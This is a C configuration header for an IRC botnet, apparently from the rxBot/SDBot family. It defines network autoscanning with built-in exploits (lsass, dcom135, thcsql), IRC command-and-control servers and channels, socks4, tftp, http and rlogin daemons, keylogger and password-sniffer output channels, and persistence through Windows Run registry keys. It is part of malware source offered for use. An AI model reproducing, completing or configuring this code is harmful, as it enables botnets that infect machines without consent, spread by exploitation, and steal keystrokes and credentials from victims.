// bot configuration (generic) - doesn't need to be encrypted
// random autoscan on statup config
#define AUIP "" //  example 218.220.x.x ip for autoscan on startup . leave it empty for default local scan .
#define sploit "thcsql" // lsass,dcom135,thcsql. all exploit working tested.
int athread = 50; // thread for autoscan
int delay = 4; //delay for autoscan
int minutes = 20; // 0 minutes = for ever
BOOL arandom = TRUE; //
////////
int port = 6666;				// server port
int port2 = 6667;				// backup server port
int socks4port = 7655;			// Port # for sock4 daemon to run on  - CHANGE THIS!!!
int tftpport = 69;				// Port # for tftp daemon to run on
int httpport = 80;			// Port # for http daemon to run on
int rloginport = 513;			// Port # for rlogin daemon to run on
BOOL topiccmd = TRUE;			// set to TRUE to enable topic commands
BOOL rndfilename = FALSE;		// use random file name
BOOL AutoStart = TRUE;			// enable autostart registry keys
char prefix = '.';				// command prefix (one character max.)
int maxrand = 8;				// how many random numbers in the nick
int nicktype = COUNTRYNICK;		// nick type (see rndnick.h)
BOOL nickprefix = TRUE;			// nick uptime & mirc prefix

#ifdef DEBUG_LOGGING
char logfile[]="c:\\sys.ocx";
#endif

#ifndef NO_CRYPT // Only use encrypted strings or your binary will not be secure!!

#else  // Recommended to use this only for Crypt() setup, this is unsecure.

char botid[] = "";						// bot id
char version[] = "modded - fixxed spread Woopie";		// Bots !version reply
char password[] = "";					// bot password
char server[] = ""; // 
char serverpass[] = "";						// server password
char channel[] = "#";				// channel that the bot should join
char chanpass[] = "";						// channel password
char server2[] = "";						// backup server (optional)
char channel2[] = "#";						// backup channel (optional)
char chanpass2[] = "";						// backup channel password (optional)
char filename[] = "";			// destination file name
char keylogfile[] = "";				// keylog filename
char valuename[] = "";		// value name for autostart
char nickconst[] = "";					// first part to the bot's nick
char szLocalPayloadFile[]="";	// Payload filename
char modeonconn[] = "";					// Can be more than one mode and contain both + and -
char exploitchan[] = "";					// Channel where exploit messages get redirected
char keylogchan[] = "";						// Channel where keylog messages get redirected
char psniffchan[] = "";	

char *authost[] = {
	"*@style.nl"
};

char *versionlist[] = {
	"x",
};

char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";

#endif

#ifdef PLAIN_CRYPT
char key[16] = "fudy3hdy7skr9s6g"; // CHANGE THIS!!! hmmm..Do I even need this now?
#endif

